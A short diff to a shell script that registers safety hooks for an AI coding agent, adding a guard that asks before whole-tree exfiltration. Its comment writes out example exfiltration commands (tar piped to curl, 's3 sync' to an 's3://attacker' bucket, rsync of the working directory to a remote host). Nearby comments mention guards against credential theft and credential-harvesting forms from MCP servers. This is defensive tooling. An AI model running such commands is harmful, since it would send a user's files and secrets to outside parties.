@@ -72,6 +72,12 @@ get_hooks_for_mode() {
   # safety.sh only guards cloud credential-theft/escape, not bulk deletes. ASK on
   # terminate/delete/uninstall/rm-r. Disable: SUPERCHARGER_CLOUD_CLI_GUARD=0.
   hooks+=("PreToolUse|Bash|${hooks_dir}/cloud-cli-destructive-guard.sh|")
+  # v2.23.19: whole-tree exfil that carries NO sensitive-name token — safety-detect's
+  # upload arms are gated on _SENSITIVE_PATHS, so `tar czf - . | curl --data-binary @-`,
+  # `aws s3 sync . s3://attacker`, `rsync -a . host:` slip through. ASK on the SHAPE
+  # (archive-to-network-sink, or whole cwd/root/home sync to remote). Anchored so local
+  # archives + build-dir deploys pass. /profile-gated. Disable: SUPERCHARGER_BULK_EXFIL_GUARD=0.
+  hooks+=("PreToolUse|Bash|${hooks_dir}/bulk-exfil-guard.sh|")
   # v2.7.49: block credential-harvesting Elicitation forms — an MCP server asking
   # for a password/token/api-key in a routine-looking form. Declines when the
   # schema has credential-style fields and the server isn't in
